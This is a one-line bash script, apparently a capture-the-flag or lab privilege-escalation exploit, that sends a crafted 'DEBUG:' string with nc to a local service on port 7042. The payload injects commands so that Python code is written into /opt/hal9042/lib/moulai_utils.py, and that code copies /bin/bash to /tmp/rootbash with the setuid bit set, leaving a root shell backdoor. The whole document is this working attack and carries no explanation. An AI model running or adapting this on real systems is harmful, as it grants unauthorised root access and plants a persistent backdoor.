#!/bin/bash

echo 'DEBUG: echo "echo \"import os; os.system('\''cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash'\'')\" > /opt/hal9042/lib/moulai_utils.py" >> /tmp/test' | nc 127.0.0.1 7042